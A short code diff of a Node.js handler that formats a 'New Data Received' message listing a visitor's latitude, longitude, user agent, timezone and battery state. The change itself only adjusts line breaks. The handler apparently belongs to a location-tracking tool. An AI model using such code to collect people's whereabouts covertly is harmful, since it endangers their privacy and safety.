@@ -47,7 +47,8 @@ module.exports = async (req, res) => {
       const messageText = `*📌 New Data Received:*\n\n` +
         `*📍 Latitude:* ${latitude}\n` +
         `*📍 Longitude:* ${longitude}\n` +
-        `*📱 User Agent:* ${userAgent || 'Unknown'}\n\n` +
+        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
+        
         `*📅 Date:* ${dateTime}\n` +
         `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
         `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
